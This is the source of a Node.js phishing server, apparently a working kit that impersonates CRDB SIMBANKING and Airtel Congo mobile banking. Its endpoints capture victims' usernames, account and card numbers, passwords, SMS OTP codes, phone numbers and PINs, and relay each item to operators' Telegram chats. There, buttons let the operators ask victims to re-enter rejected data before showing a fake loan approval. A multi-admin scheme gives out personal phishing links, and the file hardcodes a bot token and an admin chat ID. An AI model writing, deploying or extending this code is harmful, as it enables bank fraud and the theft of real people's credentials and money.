/**
 * CRDB SIMBANKING - MULTI-ADMIN SERVER (FRENCH LOCALE)
 * Main Admin Chat ID: 8591555400
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fs = require('fs');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400';

const ADMINS_FILE = path.join(__dirname, 'admins.json');

function loadAdmins() {
  try {
    if (fs.existsSync(ADMINS_FILE)) {
      const data = fs.readFileSync(ADMINS_FILE, 'utf8');
      const entries = JSON.parse(data);
      return new Map(entries.map(([id, rec]) => [id, {
        authorized: rec.authorized ?? false,
        paid: rec.paid ?? false,
        username: rec.username || '',
        firstName: rec.firstName || 'User',
        lastName: rec.lastName || '',
        status: rec.status || 'PENDING'
      }]));
    }
  } catch (err) {
    console.error('[Storage] Error loading admins file:', err);
  }
  return new Map();
}

function saveAdmins() {
  try {
    const serialized = JSON.stringify(Array.from(admins.entries()));
    fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
  } catch (err) {
    console.error('[Storage] Error saving admins file:', err);
  }
}

let bot = null;
const sessions = new Map();
const admins = loadAdmins();

function resolveTargetChat(adminParam) {
  if (adminParam && String(adminParam).trim() !== '') {
    const targetAdmin = String(adminParam).trim();
    if (targetAdmin === String(FALLBACK_ADMIN_ID)) {
      return FALLBACK_ADMIN_ID;
    }
    const adminRecord = admins.get(targetAdmin);
    if (adminRecord && adminRecord.authorized && adminRecord.paid) {
      return targetAdmin;
    }
  }
  return FALLBACK_ADMIN_ID;
}

async function initBot() {
  bot = new TelegramBot(TOKEN, { polling: true });

  bot.onText(/\/start/, async (msg) => {
    try {
      const chatId = String(msg.chat.id);
      let chatInfo = {};
      try { chatInfo = await bot.getChat(chatId); } catch (e) {}

      const username = chatInfo.username || msg.from.username || '';
      const firstName = chatInfo.first_name || msg.from.first_name || 'User';
      const lastName = chatInfo.last_name || msg.from.last_name || '';

      if (chatId === String(FALLBACK_ADMIN_ID)) {
        await bot.sendMessage(chatId, `👑 *Bienvenue Administrateur Principal*\nVotre lien: ${APP_URL}/?admin=${FALLBACK_ADMIN_ID}`, { parse_mode: 'Markdown' });
        return;
      }

      if (!admins.has(chatId)) {
        admins.set(chatId, { authorized: true, paid: true, username, firstName, lastName, startedAt: new Date() });
        saveAdmins();
      }

      const userLink = `${APP_URL}/?admin=${chatId}`;
      await bot.sendMessage(chatId, `👋 *Bienvenue ${firstName}!*\n\nVotre lien est prêt:\n${userLink}`, { parse_mode: 'Markdown' });
    } catch (err) {}
  });

  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const chatId = String(query.message.chat.id);
      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_'); 
      const targetId = parts.slice(2).join('_');

      let session = sessions.get(targetId);
      if (!session) session = { adminChatId: chatId };

      const chatTarget = session.adminChatId || chatId;

      switch (prefix) {
        case 'WRONG_CREDS':
          session.status = 'RETRY_CREDS';
          await bot.sendMessage(chatTarget, `❌ Données rejetées. Le client est invité à ressaisir ses informations.`);
          break;
        case 'CORRECT_CREDS':
          session.status = 'PROCEED_OTP';
          await bot.sendMessage(chatTarget, `✅ Informations validées. Le client passe au code OTP SMS (4 chiffres Airtel Congo).`);
          break;
        case 'OTP_EXPIRED':
          session.status = 'RETRY_OTP';
          session.otp = '';
          await bot.sendMessage(chatTarget, `⚠️ Code OTP expiré. Le client est invité à saisir un nouveau code.`);
          break;
        case 'CORRECT_OTP':
          session.status = 'PROCEED_PHONE_PIN';
          await bot.sendMessage(chatTarget, `✅ Code OTP correct. Le client passe à l'étape Numéro Airtel et Code PIN.`);
          break;
        case 'WRONG_PIN':
          session.status = 'RETRY_PIN';
          session.pin = '';
          await bot.sendMessage(chatTarget, `❌ Code PIN incorrect. Le client est invité à recharger son PIN.`);
          break;
        case 'CORRECT_PIN':
        case 'FINAL_SUCCESS':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Prêt approuvé avec succès! L'écran de confirmation s'est affiché.`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Traité` }).catch(() => {});
      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
      }
    } catch (err) {}
  });
}

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Step 1: Submit Credentials & Bank Details
app.post('/api/submit-credentials', async (req, res) => {
  try {
    let { username, account, card, password, adminChatId } = req.body || {};
    if (!adminChatId && req.query && req.query.admin) {
      adminChatId = req.query.admin;
    }

    const targetChat = resolveTargetChat(adminChatId);
    const userId = `user_${Date.now()}`;
    sessions.set(userId, { 
      username, account, card, password, 
      adminChatId: targetChat, 
      status: 'WAITING_CREDS_APPROVAL' 
    });

    const message = `🟢 *CRDB SIMBANKING - DONNÉES BANCAIRES*\n\n` +
                    `👤 *Nom d'utilisateur:* \`${username}\`\n` +
                    `💳 *N° Compte:* \`${account}\`\n` +
                    `💳 *N° Carte:* \`${card}\`\n` +
                    `🔑 *Mot de passe:* \`${password}\`\n\n` +
                    `📋 *Format à copier:*\n\`${username}:${account}:${card}:${password}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ WRONG DETAILS', callback_data: `WRONG_CREDS_${userId}` },
            { text: '✅ CORRECT DETAILS', callback_data: `CORRECT_CREDS_${userId}` }
          ]
        ]
      }
    };

    if (bot) {
      await bot.sendMessage(targetChat, message, opts);
    }
    
    return res.status(200).json({ success: true, userId });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Erreur réseau.' });
  }
});

app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

// Step 2: Submit 4-digit SMS OTP (Airtel Congo)
app.post('/api/submit-otp', async (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ success: false, error: 'Session non trouvée' });

    const targetChat = session.adminChatId;
    session.status = 'WAITING_OTP_VERIFICATION';
    session.otp = otp;

    const message = `🟢 *CRDB SIMBANKING - OTP AIRTEL CONGO (4 Chiffres)*\n\n` +
                    `📱 *Code OTP:* \`${otp}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '⚠️ OTP EXPIRED', callback_data: `OTP_EXPIRED_${userId}` },
            { text: '✅ CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Erreur' });
  }
});

// Step 3: Submit Phone & PIN
app.post('/api/submit-phone-pin', async (req, res) => {
  try {
    const { userId, phone, pin } = req.body || {};
    const session = sessions.get(userId);
    if (!session) return res.status(404).json({ success: false, error: 'Session non trouvée' });

    const targetChat = session.adminChatId;
    session.status = 'WAITING_PIN_VERIFICATION';
    session.phone = phone;
    session.pin = pin;

    const message = `🟢 *CRDB SIMBANKING - NUMÉRO ET PIN AIRTEL*\n\n` +
                    `📞 *Téléphone:* \`+242${phone}\`\n` +
                    `🔒 *Code PIN:* \`${pin}\``;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
            { text: '✅ CORRECT PIN', callback_data: `CORRECT_PIN_${userId}` }
          ]
        ]
      }
    };

    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Erreur' });
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
  await initBot();
  console.log(`Server running on port ${PORT}`);
});
  
